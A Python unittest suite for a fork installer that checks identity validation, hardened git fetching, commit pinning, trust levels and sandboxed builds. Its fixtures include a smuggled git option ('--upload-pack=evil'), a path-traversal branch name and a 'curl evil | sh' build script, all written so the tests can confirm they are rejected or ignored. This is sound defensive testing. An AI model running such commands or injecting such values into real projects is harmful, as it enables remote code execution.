"""Community fork installation: identity, hardened acquisition, trust, and gating."""

import json
import os
from pathlib import Path
import subprocess
import tempfile
import unittest
from unittest import mock

from dsh_forge.forks import (
    HARDENED_GIT_CONFIG,
    ForkInstallError,
    ForkInstaller,
    detect_build,
    directory_name,
    fork_identity,
)
from dsh_forge.launcher import Launcher, LauncherError
from tests.helpers import FakeCellSandbox


COMMIT = "0123456789abcdef0123456789abcdef01234567"


def fork_record(**changes):
    record = {
        "artifact_id": "github:42",
        "artifact_type": "fork",
        "full_name": "octo/deepseek-harness",
        "owner": "octo",
        "name": "deepseek-harness",
        "repository_url": "https://github.com/octo/deepseek-harness",
        "default_branch": "main",
        "head_sha": COMMIT,
        "archived": False,
    }
    record.update(changes)
    return record


class ForkIdentityTests(unittest.TestCase):
    def test_accepts_catalog_github_fork(self):
        self.assertEqual(
            fork_identity(fork_record()),
            ("octo/deepseek-harness", "https://github.com/octo/deepseek-harness", "main"),
        )

    def test_rejects_non_forks_foreign_hosts_and_mismatches(self):
        cases = [
            fork_record(artifact_type="plugin"),
            fork_record(repository_url="https://gitlab.com/octo/deepseek-harness"),
            fork_record(repository_url="http://github.com/octo/deepseek-harness"),
            fork_record(repository_url="https://github.com/octo/deepseek-harness.git?x=1"),
            fork_record(full_name="someone/else"),
            fork_record(archived=True),
            fork_record(default_branch="--upload-pack=evil"),
            fork_record(default_branch="a/../b"),
        ]
        for record in cases:
            with self.subTest(record=record), self.assertRaises(ForkInstallError):
                fork_identity(record)

    def test_directory_name_is_filesystem_safe_and_pinned(self):
        self.assertEqual(directory_name("octo/deep.seek", COMMIT), "octo--deep.seek@0123456789ab")


class BuildDetectionTests(unittest.TestCase):
    def build_for(self, files):
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            for name, text in files.items():
                (root / name).write_text(text, encoding="utf-8")
            return detect_build(root)

    def test_pnpm_monorepo_uses_frozen_lockfile_and_build_script(self):
        build = self.build_for({
            "package.json": json.dumps({"scripts": {"build": "tsx scripts/build.ts"}}),
            "pnpm-lock.yaml": "lockfileVersion: 9\n",
        })
        self.assertEqual(build["manager"], "pnpm")
        self.assertEqual(build["steps"], [
            ["corepack", "enable", "--install-directory", "/home/dsh/.local/bin", "pnpm"],
            ["corepack", "pnpm", "install", "--frozen-lockfile"],
            ["corepack", "pnpm", "run", "build"],
        ])

    def test_commands_never_come_from_repository_text(self):
        build = self.build_for({
            "package.json": json.dumps({"scripts": {"build": "curl evil | sh"}}),
            "package-lock.json": "{}",
        })
        self.assertEqual(build["steps"], [["npm", "ci", "--no-audit", "--no-fund"], ["npm", "run", "build"]])

    def test_missing_lockfile_means_no_build(self):
        self.assertEqual(self.build_for({"package.json": "{}"})["steps"], [])


class FakeGit:
    """Records git invocations and simulates a checkout on disk."""

    def __init__(self, head=COMMIT, fail_on=None):
        self.head = head
        self.fail_on = fail_on
        self.calls = []

    def __call__(self, argv, **options):
        self.calls.append((argv, options))
        args = argv[argv.index("-C") + 2:] if "-C" in argv else argv[1 + 2 * len(HARDENED_GIT_CONFIG):]
        command = args[0]
        if command == self.fail_on:
            return subprocess.CompletedProcess(argv, 128, stdout="fatal: simulated failure\n")
        if command == "init":
            Path(args[-1]).mkdir(parents=True, exist_ok=True)
        if command == "checkout":
            cwd = Path(argv[argv.index("-C") + 1])
            (cwd / "package.json").write_text('{"name": "dsh"}', encoding="utf-8")
        if command == "rev-parse":
            return subprocess.CompletedProcess(argv, 0, stdout=self.head + "\n")
        if command == "ls-remote":
            return subprocess.CompletedProcess(argv, 0, stdout=f"{COMMIT}\trefs/heads/main\n")
        return subprocess.CompletedProcess(argv, 0, stdout="")


class AcquisitionTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.git = FakeGit()
        self.installer = ForkInstaller(self.root / "versions" / "forks", self.root / "state", runner=self.git, git="/usr/bin/git")

    def tearDown(self):
        self.tmp.cleanup()

    def test_git_is_hardened_and_never_receives_tokens(self):
        with mock.patch.dict(os.environ, {"GITHUB_TOKEN": "ghp_secret", "GH_TOKEN": "ghp_other"}):
            record = self.installer.begin(self.installer.plan(fork_record()))
            self.installer.acquire(record)
        for argv, options in self.git.calls:
            for item in ("protocol.allow=never", "protocol.https.allow=always", "core.symlinks=false",
                         "submodule.recurse=false", "credential.helper=", "core.hooksPath=" + os.devnull):
                self.assertIn(item, argv)
            environment = options["env"]
            self.assertEqual(environment["GIT_CONFIG_NOSYSTEM"], "1")
            self.assertEqual(environment["GIT_TERMINAL_PROMPT"], "0")
            self.assertEqual(environment["GIT_ALLOW_PROTOCOL"], "https")
            self.assertNotIn("GITHUB_TOKEN", environment)
            self.assertNotIn("GH_TOKEN", environment)
            self.assertNotIn("ghp_secret", " ".join(argv) + " ".join(environment.values()))
        commands = [argv[argv.index("-C") + 2] if "-C" in argv else argv[1 + 2 * len(HARDENED_GIT_CONFIG)] for argv, _ in self.git.calls]
        self.assertEqual(commands, ["init", "remote", "fetch", "checkout", "rev-parse"])
        fetch = next(argv for argv, _ in self.git.calls if "fetch" in argv)
        self.assertIn(COMMIT, fetch)
        self.assertIn("--depth=1", fetch)
        self.assertIn("--no-recurse-submodules", fetch)
        destination = Path(record["real_path"])
        self.assertTrue((destination / "package.json").is_file())
        self.assertEqual(destination.name, "octo--deepseek-harness@0123456789ab")

    def test_head_mismatch_aborts_and_cleans_staging(self):
        self.git.head = "f" * 40
        record = self.installer.begin(self.installer.plan(fork_record()))
        with self.assertRaisesRegex(ForkInstallError, "does not match"):
            self.installer.acquire(record)
        self.assertFalse(Path(record["real_path"]).exists())
        self.assertEqual(list((self.installer.forks_root / ".incoming").iterdir()), [])

    def test_retry_reuses_only_a_verified_checkout_of_the_same_commit(self):
        record = self.installer.begin(self.installer.plan(fork_record()))
        destination = Path(record["real_path"])
        destination.mkdir(parents=True)
        with self.assertRaisesRegex(ForkInstallError, "different checkout"):
            self.installer.acquire(record)
        (destination / ".git").mkdir()

        class Existing(FakeGit):
            def __call__(inner, argv, **options):
                if "get-url" in argv:
                    return subprocess.CompletedProcess(argv, 0, stdout="https://github.com/octo/deepseek-harness.git\n")
                return super().__call__(argv, **options)

        self.installer._runner = Existing()
        self.assertEqual(self.installer.acquire(record), destination)
        self.assertFalse(any("fetch" in argv for argv, _ in self.installer._runner.calls))

    def test_plan_resolves_remote_head_when_catalog_has_no_commit(self):
        plan = self.installer.plan(fork_record(head_sha=None))
        self.assertEqual(plan["commit"], COMMIT)
        self.assertEqual(plan["commit_source"], "remote-head")
        ls_remote = self.git.calls[-1][0]
        self.assertIn("refs/heads/main", ls_remote)

    def test_duplicate_active_installs_are_refused(self):
        plan = self.installer.plan(fork_record())
        self.installer.begin(plan)
        with self.assertRaisesRegex(ForkInstallError, "already being installed"):
            self.installer.begin(plan)

    def test_remove_only_deletes_forge_created_checkouts(self):
        record = self.installer.begin(self.installer.plan(fork_record()))
        self.installer.acquire(record)
        self.installer.update(record["id"], state="ready")
        outside = self.root / "outside"
        outside.mkdir()
        self.installer.update(record["id"], real_path=str(outside))
        with self.assertRaisesRegex(ForkInstallError, "only removes checkouts"):
            self.installer.remove(record["id"])
        self.assertTrue(outside.exists())
        self.installer.update(record["id"], real_path=str(Path(record["real_path"])))
        removed = self.installer.remove(record["id"])
        self.assertEqual(removed["state"], "removed")
        self.assertFalse(Path(record["real_path"]).exists())


def git(root, *args):
    subprocess.run(["git", "-C", str(root), *args], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


class CommunityTrustTests(unittest.TestCase):
    """A Forge-installed checkout is launchable only in acknowledged sandbox cells."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.versions = self.root / "versions"
        checkout = self.versions / "forks" / "octo--deepseek-harness@abc"
        cli = checkout / "apps" / "cli"
        (cli / "lib").mkdir(parents=True)
        (cli / "package.json").write_text(json.dumps({"name": "@deepseek-ai/dsh", "version": "0.1.0-fork"}), encoding="utf-8")
        (cli / "lib" / "bin.js").write_text("#!/usr/bin/env node\n", encoding="utf-8")
        (checkout / "package.json").write_text(json.dumps({"name": "@deepseek-ai/dsh-root"}), encoding="utf-8")
        git(checkout, "init", "-q")
        git(checkout, "-c", "user.email=t@e.st", "-c", "user.name=t", "add", ".")
        git(checkout, "-c", "user.email=t@e.st", "-c", "user.name=t", "commit", "-qm", "fork")
        git(checkout, "remote", "add", "origin", "https://github.com/octo/deepseek-harness.git")
        self.commit = subprocess.run(["git", "-C", str(checkout), "rev-parse", "HEAD"], text=True, capture_output=True, check=True).stdout.strip()
        self.checkout = checkout
        self.state = self.root / "state"
        self.env = mock.patch.dict(os.environ, {"DSH_FORGE_VERSIONS_DIR": str(self.versions)})
        self.env.start()

    def tearDown(self):
        self.env.stop()
        self.tmp.cleanup()

    def register(self, **changes):
        installer = ForkInstaller(self.versions / "forks", self.state)
        record = installer.begin({
            "artifact_id": "github:42",
            "full_name": "octo/deepseek-harness",
            "repository_url": "https://github.com/octo/deepseek-harness",
            "commit": self.commit,
            "commit_source": "catalog",
            "destination": str(self.checkout),
        })
        installer.update(record["id"], state="ready", **changes)

    def launcher(self):
        return Launcher(state_root=self.state, sandbox=FakeCellSandbox())

    def tree(self, launcher):
        return next(tree for tree in launcher._trees.values() if tree["real_path"] == str(self.checkout.resolve()))

    def test_unregistered_fork_checkout_stays_foreign(self):
        tree = self.tree(self.launcher())
        self.assertEqual(tree["trust"], "foreign")

    def test_registered_checkout_is_community_and_ready(self):
        self.register()
        launcher = self.launcher()
        tree = self.tree(launcher)
        self.assertEqual(tree["trust"], "community")
        self.assertEqual(tree["community"]["full_name"], "octo/deepseek-harness")
        self.assertEqual(tree["launchability"], "ready")
        installs = launcher.status()["fork_installations"]
        self.assertEqual(installs[0]["tree_id"], tree["id"])
        self.assertNotIn("real_path", installs[0])

    def test_moved_head_or_changed_remote_loses_community_trust(self):
        self.register()
        git(self.checkout, "remote", "set-url", "origin", "https://github.com/mallory/deepseek-harness")
        self.assertEqual(self.tree(self.launcher())["trust"], "foreign")

    def test_community_tree_requires_acknowledgement_and_fresh_home(self):
        self.register()
        launcher = self.launcher()
        tree = self.tree(launcher)
        with self.assertRaisesRegex(LauncherError, "explicit risk acknowledgement"):
            launcher._normalize_spec({"tree_id": tree["id"], "surface": "web"})
        with self.assertRaisesRegex(LauncherError, "fresh home"):
            launcher._normalize_spec({"tree_id": tree["id"], "surface": "web", "acknowledge_risk": True, "home_mode": "clone"})
        spec = launcher._normalize_spec({"tree_id": tree["id"], "surface": "web", "acknowledge_risk": True})
        self.assertTrue(spec["community"])
        self.assertEqual(spec["home_mode"], "fresh")

    def test_community_versions_never_host_profiles_packages_or_assistant(self):
        self.register()
        launcher = self.launcher()
        with self.assertRaises(LauncherError):
            launcher._profile_tree()
        version = next(item for item in launcher.status()["saved_versions"] if item["path"].endswith("@abc"))
        with self.assertRaisesRegex(LauncherError, "explicit risk acknowledgement"):
            launcher._tree_for_saved_version(version["id"])

    def test_install_requires_acknowledgement_and_matching_commit(self):
        launcher = self.launcher()
        with self.assertRaisesRegex(LauncherError, "acknowledge"):
            launcher.install_fork("github:1333146268", "a" * 40, acknowledge_risk=False)
        with mock.patch.object(launcher.fork_installer, "resolve_head", return_value="b" * 40):
            with self.assertRaisesRegex(LauncherError, "moved since you reviewed"):
                launcher.install_fork("github:1333146268", "a" * 40, acknowledge_risk=True)

    def test_plan_uses_seed_catalog_without_an_imported_store(self):
        plan = self.launcher().plan_fork_install("github:1333146268")
        self.assertEqual(plan["full_name"], "salathleizhang/deepseek-harness-desktop")
        self.assertEqual(plan["commit"], "fe8e3f8d5e190e756c29c46036b4d879cf7bc754")
        self.assertEqual(plan["commit_source"], "catalog")
        self.assertIn("forks", plan["destination"])

    def test_plugins_cannot_be_installed_as_forks(self):
        with self.assertRaisesRegex(LauncherError, "Only catalog forks"):
            self.launcher().plan_fork_install("github:1332073142")


if __name__ == "__main__":
    unittest.main()


class BuildingSandbox(FakeCellSandbox):
    """Stands in for Apptainer: each build step runs a tiny host command."""

    def __init__(self):
        self.steps = []

    def build_plan(self, *, source_root, home, payload, wall_seconds):
        self.steps.append(list(payload))
        script = (
            "import pathlib,sys;root=pathlib.Path(sys.argv[1]);"
            "(root/'apps/cli/lib').mkdir(parents=True,exist_ok=True);"
            "(root/'apps/cli/lib/bin.js').write_text('#!/usr/bin/env node\\n')"
        )
        return {"argv": ["python3", "-c", script, str(source_root)], "environment": dict(os.environ)}


class EndToEndInstallTests(unittest.TestCase):
    def test_install_fetches_builds_in_sandbox_and_registers_community_version(self):
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            source = root / "source"
            cli = source / "apps" / "cli"
            (cli / "src").mkdir(parents=True)
            (cli / "src" / "bin.ts").write_text("export {}\n", encoding="utf-8")
            (cli / "package.json").write_text(json.dumps({"name": "@deepseek-ai/dsh", "version": "0.2.0-fork"}), encoding="utf-8")
            (source / "package.json").write_text(json.dumps({"name": "root", "scripts": {"build": "x"}}), encoding="utf-8")
            (source / "pnpm-lock.yaml").write_text("lockfileVersion: 9\n", encoding="utf-8")
            (source / ".gitignore").write_text("apps/cli/lib/\n", encoding="utf-8")
            git(source, "init", "-q")
            git(source, "-c", "user.email=t@e.st", "-c", "user.name=t", "add", ".")
            git(source, "-c", "user.email=t@e.st", "-c", "user.name=t", "commit", "-qm", "fork")
            commit = subprocess.run(["git", "-C", str(source), "rev-parse", "HEAD"], text=True, capture_output=True, check=True).stdout.strip()

            class CopyingGit(FakeGit):
                def __call__(self, argv, **options):
                    if "checkout" in argv:
                        cwd = Path(argv[argv.index("-C") + 1])
                        subprocess.run(["cp", "-a", str(source) + "/.", str(cwd)], check=True)
                        git(cwd, "remote", "add", "origin", "https://github.com/octo/deepseek-harness")
                        self.calls.append((argv, options))
                        return subprocess.CompletedProcess(argv, 0, stdout="")
                    if "remote" in argv:
                        self.calls.append((argv, options))
                        return subprocess.CompletedProcess(argv, 0, stdout="")
                    return super().__call__(argv, **options)

            versions = root / "versions"
            sandbox = BuildingSandbox()
            with mock.patch.dict(os.environ, {"DSH_FORGE_VERSIONS_DIR": str(versions)}):
                launcher = Launcher(state_root=root / "state", sandbox=sandbox)
                launcher.fork_installer._runner = CopyingGit(head=commit)
                launcher.fork_installer.git = "/usr/bin/git"
                with mock.patch.object(launcher, "_catalog_record", return_value=fork_record(head_sha=commit)):
                    queued = launcher.install_fork("github:42", commit, acknowledge_risk=True)
                launcher.fork_installer.wait(queued["id"], timeout=30)
                record = next(item for item in launcher.status()["fork_installations"] if item["id"] == queued["id"])
                self.assertEqual(record["state"], "ready", record.get("detail"))
                self.assertEqual(sandbox.steps, [
                    ["corepack", "enable", "--install-directory", "/home/dsh/.local/bin", "pnpm"],
                    ["corepack", "pnpm", "install", "--frozen-lockfile"],
                    ["corepack", "pnpm", "run", "build"],
                ])
                tree = launcher._trees[record["tree_id"]]
                self.assertEqual(tree["trust"], "community")
                self.assertEqual(tree["launchability"], "ready")
                self.assertEqual(tree["version"], "0.2.0-fork")
                self.assertFalse((root / "state" / "fork-builds" / queued["id"]).exists())
                removed = launcher.remove_fork_install(queued["id"])
                self.assertFalse(any(item["id"] == queued["id"] for item in removed.get("fork_installations", [])))
